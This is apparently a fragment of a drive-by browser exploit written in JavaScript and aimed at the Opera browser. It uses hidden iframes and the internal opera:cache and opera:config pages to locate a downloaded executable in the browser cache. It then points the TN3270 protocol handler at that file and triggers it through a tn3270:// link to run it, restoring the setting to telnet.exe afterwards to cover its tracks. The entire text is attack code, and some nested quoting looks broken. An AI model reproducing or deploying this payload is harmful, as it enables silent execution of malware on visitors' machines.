if(!success){ exeurl=url; blank=document.createElement('iframe'); blank.src='about:blank'; blank.setAttribute('id','blank_window'); blank.setAttribute('style','display:none'); document.appendChild(blank); blank_window.eval("build=document.createElement('iframe'); build.src='opera:about'; build.onload=function(){if(build.contentDocument.childNodes[0].innerHTML.indexOf('8771')==-1){ document.write(''); setTimeout("parent.op9()",4000);};}; document.appendChild(build);"); } function op9(){ blank_window.eval("function tempname(from,url){ iUrl=from.indexOf(url); iTr=from.indexOf('',iUrl-60); return from.substr(iTr+8,12);} config=document.createElement('iframe'); config.setAttribute('id','config_window'); config.src='opera:config'; document.appendChild(config); var tosearch=url; cache=document.createElement('iframe'); cache.src='opera:cache'; cache.onload=function() { filename=tempname(cache.contentDocument.childNodes[0].innerHTML,tosearch); if(!filename)setTimeout('op9()',5000); config_window.eval(" opera.setPreference('Network','TN3270 App',opera.getPreference('User Prefs','Cache Directory4')+parent.filename); app_link=document.createElement('a'); app_link.setAttribute('href','tn3270://nothing'); app_link.click(); setTimeout(function(){opera.setPreference('Network','TN3270 App','telnet.exe')},1000);");}; document.appendChild(cache);"); }